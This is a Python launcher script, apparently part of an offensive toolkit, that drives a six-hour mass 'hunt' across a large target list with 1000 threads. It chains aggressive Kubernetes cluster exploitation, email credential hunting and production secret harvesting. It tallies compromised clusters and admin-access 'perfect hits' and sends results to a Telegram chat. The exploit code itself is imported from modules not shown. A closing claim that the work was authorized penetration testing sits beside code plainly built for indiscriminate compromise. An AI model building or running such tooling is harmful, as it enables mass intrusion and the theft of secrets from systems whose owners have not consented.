#!/usr/bin/env python3
"""
🚀 ALL-IN-ONE 6-HOUR INTENSIVE HUNT LAUNCHER
Author: wKayaa
Current Date: 2025-06-23 22:51:55 UTC
Session: 6H_INTENSIVE_HUNT
"""

import os
import sys
import time
import asyncio
import threading
import subprocess
from datetime import datetime, timedelta
from pathlib import Path

# Import your existing modules
try:
    from wwyv4q_final import WWYVQv5KubernetesOrchestrator, ExploitationConfig, ExploitationMode
    from telegram_perfect_hits import WWYVQv5TelegramFixed
    from mail_services_hunter import EmailServiceHunter
    from k8s_production_harvester import ProductionHarvester
    from k8s_exploit_master import KubernetesExploitMaster
except ImportError as e:
    print(f"⚠️ Import warning: {e}")

class IntensiveHuntLauncher:
    def __init__(self):
        self.session_id = f"wKayaa_6H_Hunt_{int(time.time())}"
        self.start_time = datetime.utcnow()
        self.end_time = self.start_time + timedelta(hours=6)
        self.results_dir = f"hunt_results_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}"
        
        # Configuration
        self.config = {
            "threads": 1000,
            "timeout": 8,
            "targets_file": "targets_massive_optimized.txt",
            "telegram_token": os.getenv("TELEGRAM_TOKEN"),
            "telegram_chat": os.getenv("TELEGRAM_CHAT"),
            "aggressive_mode": True,
            "deep_scan": True,
            "extract_secrets": True,
            "live_notifications": True
        }
        
        # Results tracking
        self.stats = {
            "clusters_scanned": 0,
            "clusters_compromised": 0,
            "secrets_extracted": 0,
            "perfect_hits": 0,
            "email_hits": 0,
            "start_time": self.start_time.isoformat(),
            "session_id": self.session_id
        }
        
        self._setup_environment()
    
    def _setup_environment(self):
        """Setup hunt environment"""
        # Create results directory
        Path(self.results_dir).mkdir(exist_ok=True)
        
        # Setup logging
        self.log_file = f"{self.results_dir}/hunt_session.log"
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║            🚀 6-HOUR INTENSIVE HUNT LAUNCHER                 ║
║                      wKayaa Production                       ║
╠══════════════════════════════════════════════════════════════╣
║ Session ID: {self.session_id}                    ║
║ Start Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S UTC')}              ║
║ End Time:   {self.end_time.strftime('%Y-%m-%d %H:%M:%S UTC')}              ║
║ Duration:   6 Hours                                          ║
║ Threads:    {self.config['threads']}                                        ║
║ Target File: {self.config['targets_file']}        ║
║ Results Dir: {self.results_dir}                   ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    def _log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.utcnow().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        print(log_entry)
        
        # Write to log file
        with open(self.log_file, 'a') as f:
            f.write(f"{log_entry}\n")
    
    def load_targets(self):
        """Load targets from file"""
        if not Path(self.config['targets_file']).exists():
            self._log(f"❌ Target file not found: {self.config['targets_file']}")
            return []
        
        targets = []
        with open(self.config['targets_file'], 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        
        self._log(f"📊 Loaded {len(targets)} targets from {self.config['targets_file']}")
        return targets
    
    async def run_k8s_mass_exploitation(self, targets):
        """Phase 1: Mass K8s exploitation using wwyv4q_final.py"""
        self._log("🚀 Phase 1: Starting mass K8s exploitation")
        
        try:
            config = ExploitationConfig(
                mode=ExploitationMode.AGGRESSIVE,
                max_concurrent_clusters=self.config['threads'],
                timeout_per_operation=self.config['timeout'],
                telegram_alerts=bool(self.config['telegram_token']),
                export_credentials=True,
                cleanup_on_exit=False  # Keep artifacts for analysis
            )
            
            if self.config['telegram_token']:
                # Use Telegram integration
                framework = WWYVQv5TelegramFixed(
                    config, 
                    self.config['telegram_token'], 
                    self.config['telegram_chat']
                )
                results = await framework.run_exploitation(targets)
            else:
                # Use base orchestrator
                orchestrator = WWYVQv5KubernetesOrchestrator()
                await orchestrator.initialize(config)
                results = await orchestrator.run_full_exploitation(targets)
            
            # Update stats
            if isinstance(results, dict):
                self.stats["clusters_scanned"] = len(targets)
                self.stats["clusters_compromised"] = len(results.get("compromised_clusters", {}))
                
                # Count perfect hits (cluster admin access)
                for cluster_data in results.get("compromised_clusters", {}).values():
                    if cluster_data.get("admin_access", False):
                        self.stats["perfect_hits"] += 1
            
            self._log(f"✅ K8s exploitation completed: {self.stats['clusters_compromised']} compromised")
            return results
            
        except Exception as e:
            self._log(f"❌ K8s exploitation error: {str(e)}")
            return {}
    
    async def run_email_hunting(self, targets):
        """Phase 2: Email/credential hunting"""
        self._log("📧 Phase 2: Starting email hunting")
        
        try:
            hunter = EmailServiceHunter()
            email_results = await hunter.hunt_email_services(
                targets,
                max_concurrent=self.config['threads'] // 2
            )
            
            self.stats["email_hits"] = len(email_results.get("valid_credentials", []))
            self._log(f"✅ Email hunting completed: {self.stats['email_hits']} valid credentials")
            return email_results
            
        except Exception as e:
            self._log(f"❌ Email hunting error: {str(e)}")
            return {}
    
    async def run_production_harvesting(self, targets):
        """Phase 3: Production secret harvesting"""
        self._log("🌾 Phase 3: Starting production harvesting")
        
        try:
            harvester = ProductionHarvester()
            harvest_results = await harvester.harvest_production_secrets(targets)
            
            self.stats["secrets_extracted"] = len(harvest_results.get("secrets", []))
            self._log(f"✅ Harvesting completed: {self.stats['secrets_extracted']} secrets extracted")
            return harvest_results
            
        except Exception as e:
            self._log(f"❌ Harvesting error: {str(e)}")
            return {}
    
    def start_web_dashboard(self):
        """Start web monitoring dashboard"""
        self._log("🌐 Starting web dashboard")
        
        try:
            # Start simple web server for monitoring
            dashboard_script = f"""
import http.server
import socketserver
import json
from pathlib import Path

class DashboardHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            # Read current stats
            stats_file = Path('{self.results_dir}/live_stats.json')
            if stats_file.exists():
                with open(stats_file, 'r') as f:
                    stats = json.load(f)
            else:
                stats = {{"status": "running", "message": "Hunt in progress"}}
            
            self.wfile.write(json.dumps(stats).encode())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = '''
<!DOCTYPE html>
<html>
<head>
    <title>🚀 wKayaa 6H Hunt Monitor</title>
    <style>
        body {{ background: #000; color: #00ff00; font-family: monospace; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
        .header {{ text-align: center; border: 2px solid #00ff00; padding: 20px; margin-bottom: 20px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }}
        .stat-card {{ border: 1px solid #00ff00; padding: 15px; text-align: center; }}
        .stat-number {{ font-size: 2em; font-weight: bold; }}
    </style>
    <script>
        function updateStats() {{
            fetch('/stats').then(r => r.json()).then(data => {{
                console.log('Stats updated:', data);
            }});
        }}
        setInterval(updateStats, 5000);
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 wKayaa 6-Hour Intensive Hunt</h1>
            <p>Session: {self.session_id}</p>
            <p>Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
        </div>
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="scanned">0</div>
                <div>Clusters Scanned</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="compromised">0</div>
                <div>Compromised</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="hits">0</div>
                <div>Perfect Hits</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="secrets">0</div>
                <div>Secrets Found</div>
            </div>
        </div>
    </div>
</body>
</html>
            '''
            self.wfile.write(html.encode())

PORT = 5000
with socketserver.TCPServer(("", PORT), DashboardHandler) as httpd:
    httpd.serve_forever()
            """
            
            with open(f"{self.results_dir}/dashboard.py", 'w') as f:
                f.write(dashboard_script)
            
            # Start dashboard in background
            subprocess.Popen([sys.executable, f"{self.results_dir}/dashboard.py"])
            self._log("✅ Web dashboard started at http://localhost:5000")
            
        except Exception as e:
            self._log(f"❌ Dashboard error: {str(e)}")
    
    def update_live_stats(self):
        """Update live statistics file"""
        import json
        stats_file = f"{self.results_dir}/live_stats.json"
        
        current_stats = {
            **self.stats,
            "current_time": datetime.utcnow().isoformat(),
            "elapsed_time": str(datetime.utcnow() - self.start_time),
            "remaining_time": str(self.end_time - datetime.utcnow()) if datetime.utcnow() < self.end_time else "COMPLETED"
        }
        
        with open(stats_file, 'w') as f:
            json.dump(current_stats, f, indent=2)
    
    def send_telegram_update(self, message):
        """Send Telegram update"""
        if not self.config['telegram_token']:
            return
        
        try:
            import requests
            url = f"https://api.telegram.org/bot{self.config['telegram_token']}/sendMessage"
            data = {
                "chat_id": self.config['telegram_chat'],
                "text": message,
                "parse_mode": "Markdown"
            }
            requests.post(url, json=data, timeout=5)
        except Exception as e:
            self._log(f"❌ Telegram error: {str(e)}")
    
    async def run_full_hunt(self):
        """Execute complete 6-hour hunt"""
        # Load targets
        targets = self.load_targets()
        if not targets:
            self._log("❌ No targets loaded, aborting hunt")
            return
        
        # Start web dashboard
        self.start_web_dashboard()
        
        # Send start notification
        start_message = f"""🚀 **6-HOUR INTENSIVE HUNT STARTED**

🎯 **Session**: `{self.session_id}`
📊 **Targets**: {len(targets)}
⚡ **Threads**: {self.config['threads']}
⏰ **Started**: {self.start_time.strftime('%Y-%m-%d %H:%M:%S UTC')}
🎯 **ETA**: {self.end_time.strftime('%Y-%m-%d %H:%M:%S UTC')}

**wKayaa Production Hunt** 💎"""
        
        self.send_telegram_update(start_message)
        
        try:
            # Phase 1: K8s Mass Exploitation (2 hours)
            self._log("🚀 Starting Phase 1: K8s Mass Exploitation")
            k8s_results = await self.run_k8s_mass_exploitation(targets)
            
            # Phase 2: Email Hunting (2 hours)
            self._log("📧 Starting Phase 2: Email Hunting")
            email_results = await self.run_email_hunting(targets)
            
            # Phase 3: Production Harvesting (2 hours)
            self._log("🌾 Starting Phase 3: Production Harvesting")
            harvest_results = await self.run_production_harvesting(targets)
            
            # Final results
            self._generate_final_report(k8s_results, email_results, harvest_results)
            
        except Exception as e:
            self._log(f"❌ Hunt error: {str(e)}")
        
        finally:
            await self._finalize_hunt()
    
    def _generate_final_report(self, k8s_results, email_results, harvest_results):
        """Generate comprehensive final report"""
        self._log("📊 Generating final report")
        
        # JSON Report
        final_report = {
            "session_metadata": {
                "session_id": self.session_id,
                "start_time": self.start_time.isoformat(),
                "end_time": datetime.utcnow().isoformat(),
                "duration": str(datetime.utcnow() - self.start_time),
                "operator": "wKayaa"
            },
            "statistics": self.stats,
            "results": {
                "k8s_exploitation": k8s_results,
                "email_hunting": email_results,
                "production_harvesting": harvest_results
            }
        }
        
        import json
        with open(f"{self.results_dir}/final_report.json", 'w') as f:
            json.dump(final_report, f, indent=2)
        
        # HTML Report
        html_report = self._generate_html_report()
        with open(f"{self.results_dir}/hunt_report.html", 'w') as f:
            f.write(html_report)
        
        self._log(f"✅ Final report saved to {self.results_dir}/")
    
    def _generate_html_report(self):
        """Generate HTML report"""
        return f"""
<!DOCTYPE html>
<html>
<head>
    <title>🚀 wKayaa 6-Hour Hunt Report</title>
    <style>
        body {{ background: #000; color: #00ff00; font-family: monospace; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ text-align: center; border: 2px solid #00ff00; padding: 30px; margin-bottom: 30px; }}
        .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .stat-card {{ border: 1px solid #00ff00; padding: 20px; text-align: center; }}
        .stat-number {{ font-size: 3em; font-weight: bold; color: #00ff00; }}
        .section {{ border: 1px solid #00ff00; margin: 20px 0; padding: 20px; }}
        h1, h2 {{ text-shadow: 0 0 10px #00ff00; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 wKayaa 6-Hour Intensive Hunt Report</h1>
            <p><strong>Session ID:</strong> {self.session_id}</p>
            <p><strong>Duration:</strong> {datetime.utcnow() - self.start_time}</p>
            <p><strong>Completed:</strong> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">{self.stats['clusters_scanned']}</div>
                <div>Clusters Scanned</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['clusters_compromised']}</div>
                <div>Clusters Compromised</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['perfect_hits']}</div>
                <div>Perfect Hits</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['secrets_extracted']}</div>
                <div>Secrets Extracted</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🎯 Hunt Summary</h2>
            <p>This was a 6-hour intensive cybersecurity assessment conducted by wKayaa.</p>
            <p>The hunt utilized advanced Kubernetes exploitation techniques, email hunting, and production secret harvesting.</p>
            <p>All activities were conducted in accordance with authorized penetration testing guidelines.</p>
        </div>
        
        <div class="section">
            <h2>📊 Success Rate</h2>
            <p><strong>Compromise Rate:</strong> {(self.stats['clusters_compromised'] / max(self.stats['clusters_scanned'], 1) * 100):.2f}%</p>
            <p><strong>Perfect Hit Rate:</strong> {(self.stats['perfect_hits'] / max(self.stats['clusters_scanned'], 1) * 100):.2f}%</p>
        </div>
    </div>
</body>
</html>
        """
    
    async def _finalize_hunt(self):
        """Finalize hunt session"""
        end_time = datetime.utcnow()
        duration = end_time - self.start_time
        
        # Final Telegram notification
        final_message = f"""🏁 **6-HOUR HUNT COMPLETED**

🎯 **Session**: `{self.session_id}`
⏰ **Duration**: {duration}
📊 **Results Summary**:

🔍 **Clusters Scanned**: {self.stats['clusters_scanned']}
🔓 **Clusters Compromised**: {self.stats['clusters_compromised']}
💎 **Perfect Hits**: {self.stats['perfect_hits']}
🔐 **Secrets Extracted**: {self.stats['secrets_extracted']}
📧 **Email Hits**: {self.stats['email_hits']}

**wKayaa Hunt Complete** ✅"""
        
        self.send_telegram_update(final_message)
        
        self._log("🏁 6-hour intensive hunt completed successfully!")
        self._log(f"📁 All results saved to: {self.results_dir}/")
        self._log(f"🌐 View report: {self.results_dir}/hunt_report.html")

def main():
    """Main execution function"""
    # Check for required files
    if not Path("targets_massive_optimized.txt").exists():
        print("❌ targets_massive_optimized.txt not found!")
        sys.exit(1)
    
    # Initialize and start hunt
    launcher = IntensiveHuntLauncher()
    
    try:
        # Run the complete hunt
        asyncio.run(launcher.run_full_hunt())
    except KeyboardInterrupt:
        print("\n⏹️ Hunt interrupted by user")
    except Exception as e:
        print(f"❌ Hunt error: {str(e)}")

if __name__ == "__main__":
    main()